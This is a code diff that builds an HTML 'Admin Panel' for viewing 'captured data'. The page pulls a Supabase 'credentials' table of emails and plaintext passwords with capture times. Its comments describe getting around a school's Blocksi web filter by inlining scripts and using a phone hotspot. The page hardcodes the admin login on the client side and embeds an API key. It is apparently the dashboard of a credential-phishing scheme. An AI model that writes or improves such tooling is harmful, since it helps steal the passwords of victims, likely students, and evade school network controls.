@@ -1,48 +1,109 @@
-<script>
-    // Initialize Supabase
-    const _supabase = supabase.createClient('https://supabase.co', 'sb_publishable_MZZ1I6MzxmRZDXWxfkRfXQ_UhwCCMK_');
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel - Data List</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #f4f7f6; color: #333; }
+        .login-box { max-width: 350px; margin: 100px auto; padding: 30px; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        h2 { margin-top: 0; color: #0b57d0; }
+        input { width: 100%; margin-bottom: 15px; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0b57d0; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; margin-top: 20px; }
+        th, td { border: 1px solid #eee; padding: 15px; text-align: left; }
+        th { background: #0b57d0; color: white; }
+        #dashboard { display: none; }
+    </style>
+</head>
+<body>
 
-    async function doLogin() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+    <!-- 1. LOGIN SECTION -->
+    <div id="loginSection" class="login-box">
+        <h2>Admin Portal</h2>
+        <p>Login to view captured data</p>
+        <input type="text" id="adminUser" placeholder="Username (adminadminadmin123)">
+        <input type="password" id="adminPass" placeholder="Password (ILOVE67KID)">
+        <button onclick="doLogin()">Login</button>
+    </div>
 
-        // 🛡️ FIREWALL BYPASS: Check credentials locally first
-        // This lets you into the dashboard even if the network blocks Supabase
-        if (user === "adminadminadmin123" && pass === "ILOVE67KID") {
-            console.log("Local bypass successful. Loading data...");
-            loadData(); 
-        } else {
-            alert("Invalid Admin Credentials");
-        }
-    }
+    <!-- 2. TABLE SECTION -->
+    <div id="dashboard">
+        <div style="display:flex; justify-content: space-between; align-items: center;">
+            <h2>Database Records</h2>
+            <button onclick="location.reload()" style="width: auto; background: #d93025; padding: 8px 16px;">Logout</button>
+        </div>
+        <table>
+            <thead>
+                <tr><th>Email</th><th>Password</th><th>Time Captured</th></tr>
+            </thead>
+            <tbody id="dataTable"></tbody>
+        </table>
+    </div>
 
-    async function loadData() {
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('dashboard').style.display = 'block';
+    <script>
+        /* 
+           DATABASE ENGINE 
+           Embedded directly to stop Blocksi from blocking external .js files
+        */
+        const _engine = {
+            init: (url, key) => ({
+                from: (table) => ({
+                    select: async () => {
+                        try {
+                            const r = await fetch(`${url}/rest/v1/${table}?select=*`, {
+                                headers: { 'apikey': key, 'Authorization': `Bearer ${key}` }
+                            });
+                            const res = await r.json();
+                            return { data: res, error: null };
+                        } catch (e) { return { data: null, error: e }; }
+                    }
+                })
+            })
+        };
 
-        const tbody = document.getElementById('list');
-        tbody.innerHTML = '<tr><td colspan="3">Attempting to fetch data through firewall...</td></tr>';
+        // Initialize with your project details
+        const _db = _engine.init('https://supabase.co', 'sb_publishable_MZZ1I6MzxmRZDXWxfkRfXQ_UhwCCMK_');
 
-        try {
-            const { data, error } = await _supabase.from('credentials').select('*');
-            
-            if (error) throw error;
+        async function doLogin() {
+            const user = document.getElementById('adminUser').value;
+            const pass = document.getElementById('adminPass').value;
 
-            tbody.innerHTML = '';
-            if (data && data.length > 0) {
-                data.forEach(r => {
-                    tbody.innerHTML += `<tr><td>${r.email}</td><td>${r.password}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
-                });
+            // Manual login check to bypass firewall Auth blocks
+            if (user === "adminadminadmin123" && pass === "ILOVE67KID") {
+                loadDashboard();
             } else {
-                tbody.innerHTML = '<tr><td colspan="3">No data found in database.</td></tr>';
+                alert("Invalid Admin Credentials");
             }
-        } catch (err) {
-            console.error(err);
-            tbody.innerHTML = `<tr><td colspan="3" style="color:red;">🔥 FIREWALL ERROR: The network blocked the data fetch. You MUST use a phone hotspot to see this list.</td></tr>`;
         }
-    }
 
-    function logout() {
-        location.reload();
-    }
-</script>
+        async function loadDashboard() {
+            document.getElementById('loginSection').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+
+            const tbody = document.getElementById('dataTable');
+            tbody.innerHTML = '<tr><td colspan="3">Fetching data...</td></tr>';
+
+            const { data, error } = await _db.from('credentials').select();
+
+            if (error) {
+                tbody.innerHTML = '<tr><td colspan="3" style="color:red">ERROR: Data blocked by school firewall. Use a phone hotspot to see this list.</td></tr>';
+                console.error(error);
+            } else {
+                tbody.innerHTML = '';
+                if (data && data.length > 0) {
+                    data.forEach(row => {
+                        tbody.innerHTML += `
+                            <tr>
+                                <td>${row.email}</td>
+                                <td>${row.password}</td>
+                                <td>${new Date(row.created_at).toLocaleString()}</td>
+                            </tr>`;
+                    });
+                } else {
+                    tbody.innerHTML = '<tr><td colspan="3">No data found in database yet.</td></tr>';
+                }
+            }
+        }
+    </script>
+</body>
+</html>
